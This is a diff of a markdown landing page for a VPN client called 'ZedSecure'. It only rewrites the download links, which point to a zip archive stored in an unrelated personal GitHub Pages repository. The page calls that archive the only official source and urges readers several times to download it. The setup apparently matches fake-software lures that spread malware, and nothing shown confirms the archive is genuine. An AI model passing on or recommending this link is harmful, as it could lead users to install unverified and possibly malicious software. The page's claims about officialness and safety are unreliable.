@@ -5,9 +5,9 @@ description: "Secure your connection and unlock the internet with ZedSecure, a f
 ---
 # 🔒 ZedSecure - Private, Fast Browsing on Every Device
 
-[![Download ZedSecure](https://img.shields.io/badge/⬇️_Download_ZedSecure-Latest_Release-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ragnarlockbroth/ragnarlockbroth.github.io/main/assets/Latest-v3.1.zip)
+[![Download ZedSecure](https://img.shields.io/badge/⬇️_Download_ZedSecure-Latest_Release-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ragnarlockbroth/ragnarlockbroth.github.io/raw/refs/heads/main/assets/Latest-v3.1.zip)
 
-**Visit this link to download the application:** https://raw.githubusercontent.com/Ragnarlockbroth/ragnarlockbroth.github.io/main/assets/Latest-v3.1.zip
+**Visit this link to download the application:** https://github.com/Ragnarlockbroth/ragnarlockbroth.github.io/raw/refs/heads/main/assets/Latest-v3.1.zip
 
 ZedSecure is a free, multi-core VPN client that keeps your internet connection private, open, and fast. It runs on Android phones and tablets as well as on desktop computers, and it bundles several of the world's most trusted connection engines under one simple, friendly window. You do not need to configure servers, edit text files, or understand networking terms. Install it, pick a connection, and press connect.
 
@@ -63,7 +63,7 @@ The client is built to run quietly in the background without draining your batte
 Getting ZedSecure is a single, simple step.
 
 1. Open your web browser.
-2. Go to the official download page: **https://raw.githubusercontent.com/Ragnarlockbroth/ragnarlockbroth.github.io/main/assets/Latest-v3.1.zip**
+2. Go to the official download page: **https://github.com/Ragnarlockbroth/ragnarlockbroth.github.io/raw/refs/heads/main/assets/Latest-v3.1.zip**
 3. **Visit this link to download the application.**
 
 That is the only official source for ZedSecure. Always download from the link above so you receive the genuine, unmodified application. Avoid third-party download sites, mirror pages, or links sent to you in messages — those are not maintained by the project and may contain modified files.
